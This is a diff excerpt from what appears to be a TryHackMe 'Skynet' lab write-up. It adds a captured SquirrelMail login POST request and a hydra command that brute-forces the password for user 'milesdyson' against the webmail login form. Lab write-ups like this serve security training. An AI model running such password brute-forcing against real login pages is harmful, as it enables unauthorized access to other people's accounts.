@@ -1,4 +1,25 @@
 
+request:
+```http
+POST /squirrelmail/src/redirect.php HTTP/1.1
+Host: skynet.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 83
+Origin: http://skynet.thm
+Connection: close
+Referer: http://skynet.thm/squirrelmail/src/login.php
+Cookie: squirrelmail_language=en_US; SQMSESSID=i475m3itjrqsl755t14776qka2
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Sec-GPC: 1
+
+login_username=username&secretkey=password&js_autodetect_results=1&just_logged_in=1
+```
+
 ```sh
 ┌──(kali㉿kali)-[~/thm/skynet/logs]
 └─$ hydra -V -l milesdyson -P log1.txt skynet.thm http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
